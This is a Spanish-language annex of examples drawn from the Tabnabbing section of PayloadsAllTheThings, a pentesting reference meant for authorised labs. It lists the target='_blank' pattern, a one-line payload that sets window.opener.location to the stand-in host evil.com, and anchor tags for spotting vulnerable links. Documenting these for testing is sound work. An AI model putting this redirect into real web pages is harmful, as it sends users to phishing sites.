# Tabnabbing y engaño de pestañas: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [Tabnabbing/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Tabnabbing/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Tabnabbing / Metodología

### Variantes presentes en tablas o texto del apartado

```text
_blank
```

## 2. Tabnabbing / Explotación

### Variantes presentes en tablas o texto del apartado

```text
window.opener.location = "http://evil.com"
```

## 3. Tabnabbing / Discover

```html
<a href="..." target="_blank" rel=""> 
<a href="..." target="_blank">
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
